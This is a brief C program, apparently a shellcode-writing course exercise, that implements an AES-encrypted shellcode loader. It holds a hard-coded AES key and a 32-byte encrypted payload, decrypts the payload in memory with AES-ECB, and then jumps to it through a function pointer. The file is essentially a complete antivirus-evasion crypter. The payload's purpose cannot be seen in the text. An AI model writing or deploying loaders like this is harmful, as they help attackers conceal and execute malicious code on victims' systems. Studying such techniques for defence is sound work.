#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "aes.h"

#define SHELLCODELENGTH 32

int main(void)
{
    uint8_t i;

    uint8_t key[16] =        { (uint8_t) 0x73, (uint8_t) 0x65, (uint8_t) 0x63, (uint8_t) 0x75, (uint8_t) 0x72, (uint8_t) 0x69, (uint8_t) 0x74, (uint8_t) 0x79, (uint8_t) 0x74, (uint8_t) 0x75, (uint8_t) 0x62, (uint8_t) 0x65, (uint8_t) 0x53, (uint8_t) 0x4c, (uint8_t) 0x41, (uint8_t) 0x45 };

    uint8_t shellcode[SHELLCODELENGTH] = { (uint8_t) 0xfe, (uint8_t) 0x81, (uint8_t) 0x33, (uint8_t) 0x9e, (uint8_t) 0x8a, (uint8_t) 0x50, (uint8_t) 0x0d, (uint8_t) 0xb9, (uint8_t) 0xc0, (uint8_t) 0x9c, (uint8_t) 0x41, (uint8_t) 0xd4, (uint8_t) 0xbf, (uint8_t) 0xa0, (uint8_t) 0xb4, (uint8_t) 0x25, (uint8_t) 0x32, (uint8_t) 0x02, (uint8_t) 0x99, (uint8_t) 0xf5, (uint8_t) 0x01, (uint8_t) 0x02, (uint8_t) 0xf8, (uint8_t) 0x1b, (uint8_t) 0xfd, (uint8_t) 0x92, (uint8_t) 0xe7, (uint8_t) 0xf0, (uint8_t) 0x6b, (uint8_t) 0xf8, (uint8_t) 0x6b, (uint8_t) 0x63 };
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);

    for (i = 0; i < SHELLCODELENGTH / 16; ++i)
    {
      AES_ECB_decrypt(&ctx, shellcode + (i * 16));
    }

    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
